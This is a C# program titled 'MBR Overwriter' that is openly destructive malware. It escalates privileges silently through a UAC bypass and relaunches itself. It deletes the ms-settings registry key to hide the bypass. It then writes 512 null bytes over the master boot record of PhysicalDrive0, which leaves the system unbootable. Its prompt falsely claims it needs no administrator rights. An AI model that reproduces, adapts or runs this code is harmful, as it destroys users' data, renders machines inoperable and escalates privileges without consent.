using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

public class Program
{
    [DllImport("kernel32.dll")]
    private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

    [DllImport("kernel32.dll")]
    private static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);

    private const uint GenericAll = 0x10000000;
    private const uint FileShareRead = 0x1;
    private const uint FileShareWrite = 0x2;
    private const uint OpenExisting = 0x3;
    private const uint MbrSize = 512U;

    public static void Main()
    {
        if (!(new WindowsPrincipal(WindowsIdentity.GetCurrent())).IsInRole(WindowsBuiltInRole.Administrator))
        {
            BypassUAC.DoBypass();

            string elevateCmd = System.Reflection.Assembly.GetExecutingAssembly().Location;
            Process.Start("CMD.exe", "/c start \"" + elevateCmd + "\"");

            RegistryKey uacClear = Registry.CurrentUser.OpenSubKey("Software\\Classes\\ms-settings", true);
            uacClear.DeleteSubKeyTree("shell");
            uacClear.Close();

            Process.GetCurrentProcess().Kill();
            return;
        }

        Console.Title = "MBR Overwriter | Made by https://github.com/GabryB03";

        Console.WriteLine("This program does not require Administrator privileges.\r\n" +
            "If you press ENTER, your system will be not accessible anymore.\r\n" +
            "If you DO NOT WANT THAT, please, exit from the program.");
        Console.ReadLine();

        Console.WriteLine("Press ENTER again to confirm your decision.");
        Console.ReadLine();

        byte[] mbrData = new byte[MbrSize];
        IntPtr mbr = CreateFile("\\\\.\\PhysicalDrive0", GenericAll, FileShareRead | FileShareWrite, IntPtr.Zero, OpenExisting, 0, IntPtr.Zero);
        WriteFile(mbr, mbrData, MbrSize, out uint _, IntPtr.Zero);

        Console.WriteLine("MBR overwrite done with null data (512 bytes). System will be not accessible anymore.");
        Console.WriteLine("Press ENTER in order to exit from the program.");
        Console.ReadLine();
    }
}